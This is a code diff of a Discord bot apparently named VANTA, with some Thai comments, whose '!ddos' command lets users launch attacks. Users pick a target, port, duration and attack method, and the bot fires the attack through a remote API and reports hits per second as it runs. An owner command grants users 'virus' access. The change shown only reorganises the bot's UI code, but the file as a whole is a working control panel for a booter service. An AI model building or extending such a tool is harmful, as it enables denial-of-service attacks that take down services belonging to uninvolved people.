@@ -18,8 +18,12 @@ from config import (
 from database import Database
 
 # ═══════════════════════════════════════════
-# UI detection
+# เลือก UI ตามบริบท (prefix command vs interaction)
 # ═══════════════════════════════════════════
+import ui_v2 as ui_v2
+import ui_legacy as ui_legacy
+
+# ตรวจสอบว่า discord.py รองรับ V2 หรือไม่
 _HAS_V2 = (
     hasattr(discord, "MessageFlags")
     and hasattr(discord.MessageFlags, "components_v2")
@@ -28,24 +32,27 @@ _HAS_V2 = (
     and hasattr(discord.ui, "TextDisplay")
 )
 
-_UI_MODE = "legacy"
-try:
+def _panel_kwargs():
+    """kwargs สำหรับ !ddos (prefix command) — ใช้ embed"""
+    return ui_legacy.build_panel()
+
+def _cat_kwargs(uid, target, port, dur):
+    """kwargs สำหรับ interaction — ใช้ V2 ถ้ามี"""
     if _HAS_V2:
-        from ui_v2 import (
-            build_panel, AttackModal, build_category_view,
-            build_method_view, build_running,
-        )
-        _UI_MODE = "v2"
-    else:
-        raise ImportError("V2 not supported")
-except ImportError:
-    from ui_legacy import (
-        build_panel, AttackModal, build_category_view,
-        build_method_view, build_running,
-    )
-    _UI_MODE = "legacy"
+        return ui_v2.build_category_view(uid, target, port, dur)
+    return ui_legacy.build_category_view(uid, target, port, dur)
 
+def _method_kwargs(cat, uid, target, port, dur):
+    if _HAS_V2:
+        return ui_v2.build_method_view(cat, uid, target, port, dur)
+    return ui_legacy.build_method_view(cat, uid, target, port, dur)
 
+def _running_kwargs(method, target, port, left, total, speed, hits=0):
+    if _HAS_V2:
+        return ui_v2.build_running(method, target, port, left, total, speed, hits)
+    return ui_legacy.build_running(method, target, port, left, total, speed, hits)
+
+# ═══════════════════════════════════════════
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
@@ -53,7 +60,6 @@ intents.members = True
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 db = Database()
 active_attacks: dict[int, dict] = {}
-
 
 # ═══════════════════════════════════════════
 def _extract_host(target: str) -> str:
@@ -65,7 +71,6 @@ def _extract_host(target: str) -> str:
         if e > 0:
             return t[1:e]
     return t.split("/")[0].split(":")[0]
-
 
 def is_forbidden(target: str) -> bool:
     host = _extract_host(target)
@@ -81,7 +86,6 @@ def is_forbidden(target: str) -> bool:
     except ValueError:
         pass
     return host in FORBIDDEN_IPS
-
 
 def _parse_duration(s: str):
     s = s.strip()
@@ -102,7 +106,6 @@ def _parse_duration(s: str):
         return n * 86400
     return None
 
-
 # ═══════════════════════════════════════════
 @bot.event
 async def on_ready():
@@ -110,8 +113,7 @@ async def on_ready():
     await db.init()
     print(f"[VANTA] logged in as {bot.user}")
     print(f"[VANTA] discord.py = {discord.__version__}")
-    print(f"[VANTA] UI mode = {_UI_MODE}")
-
+    print(f"[VANTA] Components V2 = {'yes' if _HAS_V2 else 'NO — fallback to embed'}")
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -126,16 +128,14 @@ async def on_command_error(ctx, error):
     print(f"[err] {error}")
     traceback.print_exception(type(error), error, error.__traceback__)
 
-
 # ═══════════════════════════════════════════
 @bot.command(name="ddos", aliases=["panel"])
 async def ddos_cmd(ctx):
     try:
-        await ctx.send(**build_panel())
+        await ctx.send(**_panel_kwargs())
     except Exception as e:
         traceback.print_exc()
         await ctx.send(f"error: {e}")
-
 
 @bot.command(name="vi")
 async def vi_cmd(ctx, member: discord.Member = None, duration: str = "TH"):
@@ -156,7 +156,6 @@ async def vi_cmd(ctx, member: discord.Member = None, duration: str = "TH"):
         f"({'ถาวร' if forever else duration})"
     )
 
-
 @bot.command(name="unvi")
 async def unvi_cmd(ctx, member: discord.Member = None):
     if ctx.author.id != OWNER_ID:
@@ -167,7 +166,6 @@ async def unvi_cmd(ctx, member: discord.Member = None):
         return
     await db.remove_virus(member.id)
     await ctx.send(f"ปลดไวรัส **{member.mention}** แล้ว")
-
 
 # ═══════════════════════════════════════════
 # Flow
@@ -187,8 +185,7 @@ async def open_attack_modal(interaction):
         await interaction.response.send_message(
             "รอของเก่าหมดก่อน", ephemeral=True)
         return
-    await interaction.response.send_modal(AttackModal())
-
+    await interaction.response.send_modal(ui_v2.AttackModal() if _HAS_V2 else ui_legacy.AttackModal())
 
 async def handle_attack_submit(interaction, modal):
     uid = interaction.user.id
@@ -224,7 +221,7 @@ async def handle_attack_submit(interaction, modal):
     try:
         await interaction.response.send_message(
             ephemeral=True,
-            **build_category_view(uid, target, port, dur),
+            **_cat_kwargs(uid, target, port, dur),
         )
     except Exception as e:
         traceback.print_exc()
@@ -233,22 +230,20 @@ async def handle_attack_submit(interaction, modal):
         except Exception:
             pass
 
-
 async def show_method_panel(interaction, cat, target, port, dur):
     uid = interaction.user.id
     try:
         await interaction.response.edit_message(
-            **build_method_view(cat, uid, target, port, dur))
+            **_method_kwargs(cat, uid, target, port, dur))
     except Exception:
         traceback.print_exc()
-
 
 async def fire_attack(interaction, method, target, port, dur):
     uid = interaction.user.id
 
     try:
         await interaction.response.edit_message(
-            **build_running(method, target, port, dur, dur, "..."))
+            **_running_kwargs(method, target, port, dur, dur, "..."))
     except Exception:
         traceback.print_exc()
         return
@@ -268,13 +263,13 @@ async def fire_attack(interaction, method, target, port, dur):
                 data = await r.json()
     except Exception as e:
         if msg:
-            await _safe_edit(msg, build_running(method, target, port, 0, dur, f"error: {e}"))
+            await _safe_edit(msg, _running_kwargs(method, target, port, 0, dur, f"error: {e}"))
         return
 
     if not data.get("success"):
         detail = data.get("detail", "fail")
         if msg:
-            await _safe_edit(msg, build_running(method, target, port, 0, dur, f"API: {detail}"))
+            await _safe_edit(msg, _running_kwargs(method, target, port, 0, dur, f"API: {detail}"))
         return
 
     try:
@@ -290,7 +285,6 @@ async def fire_attack(interaction, method, target, port, dur):
     active_attacks[uid] = state
     asyncio.create_task(_tick(uid, state, method, target, port, dur))
 
-
 async def _safe_edit(msg, kwargs):
     if not msg:
         return
@@ -299,13 +293,11 @@ async def _safe_edit(msg, kwargs):
         return
     except Exception:
         pass
-    # fallback: ถ้า kwargs มี view ให้ลองแค่ view
     if "view" in kwargs:
         try:
             await msg.edit(view=kwargs["view"])
         except Exception:
             pass
-
 
 async def _fetch_stats(job_id):
     try:
@@ -315,7 +307,6 @@ async def _fetch_stats(job_id):
                 return await r.json()
     except Exception:
         return {}
-
 
 async def _tick(uid, state, method, target, port, dur):
     msg = state.get("msg")
@@ -338,10 +329,9 @@ async def _tick(uid, state, method, target, port, dur):
             rate = hits // elapsed
             speed_text = f"{rate}/s"
 
-        await _safe_edit(msg, build_running(
+        await _safe_edit(msg, _running_kwargs(
             method, target, port, left, dur, speed_text, hits))
 
-    # stop
     if job_id:
         try:
             async with aiohttp.ClientSession() as s:
@@ -359,15 +349,13 @@ async def _tick(uid, state, method, target, port, dur):
         info = await _fetch_stats(job_id)
         final_hits = info.get("hits", 0)
 
-    await _safe_edit(msg, build_running(
+    await _safe_edit(msg, _running_kwargs(
         method, target, port, 0, dur, "finished", final_hits))
-
 
 # ═══════════════════════════════════════════
 def _shutdown(sig, frame):
     print(f"\n[VANTA] signal {sig} — shutting down")
     raise SystemExit(0)
-
 
 def _install_signals():
     try:
@@ -375,7 +363,6 @@ def _install_signals():
         signal.signal(signal.SIGTERM, _shutdown)
     except ValueError:
         pass
-
 
 if __name__ == "__main__":
     if not BOT_TOKEN:
